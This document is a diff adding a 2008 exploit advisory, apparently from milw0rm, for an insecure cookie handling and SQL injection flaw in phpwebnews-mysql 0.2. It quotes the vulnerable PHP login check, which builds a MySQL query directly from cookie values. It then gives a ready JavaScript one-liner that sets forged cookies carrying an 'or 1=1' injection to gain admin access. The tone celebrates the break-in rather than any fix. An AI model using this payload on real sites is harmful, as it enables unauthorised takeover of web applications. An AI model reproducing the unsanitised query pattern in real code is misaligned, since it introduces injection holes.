@@ -1,0 +1,67 @@
+  ###################################################################################
+  #                                                                                 #
+  #    ...:::::phpwebnews-mysql 0.2 Insecure Cookie Handling Vulnerability ::::.... #           
+  ###################################################################################
+
+Virangar Security Team
+
+www.virangar.net
+www.virangar.ir
+
+--------
+Discoverd By :virangar security team(hadihadi)
+
+special tnx :my master hadihadi
+
+tnx to:MR.nosrati,black.shadowes,MR.hesy
+
+& all virangar members & all hackerz
+-------
+DESCRIPTION:
+phpwebnews-mysql, suffers from insecure cookie handling, when a admin login is successfull the script creates
+a cookie to show the rest of the admin area the user is already logged in. the bad thing is the cookie doesnt
+contain any password or anything alike, therefor we can craft a admin cookie and make it look like we are
+logged in as a legit admin.
+---
+vuln code in /news_manajemen/index.php: //admin area index page
+line 6-11:
+include('x_inc.php');
+
+$a1 = $_COOKIE['a1'];
+$a2 = $_COOKIE['a2'];
+
+if (password_valid($a1,$a2,'')) // a function in x-inc.php
+**********************
+now vuln code in x-inc.php:
+lin 22-39: //password_valid function codes
+
+function password_valid($pemakai, $password, $ea)
+{
+
+if ( empty($pemakai)||empty($password) )
+  return FALSE;
+
+  // koneksi database
+  $conn = db_connect();
+  if (!$conn)
+    {
+      return FALSE;
+    }
+
+if (empty($ea))
+{
+    $result = mysql_query("select * from user
+                         where user='$pemakai'
+                         and passwd='$password'");
+*******************************************************
+we can do nice and funny job :D
+sql injcetion white cookie values ;)
+---
+exploit:
+javascript:document.cookie = "a1=admin ' or 1=1/*; path=/;"; document.cookie = "a2=[what ever]; path=/;";
+-----
+now  you can get admin access and manage the cms ;)
+-------
+young iranian h4ck3rz
+
+# milw0rm.com [2008-07-26]
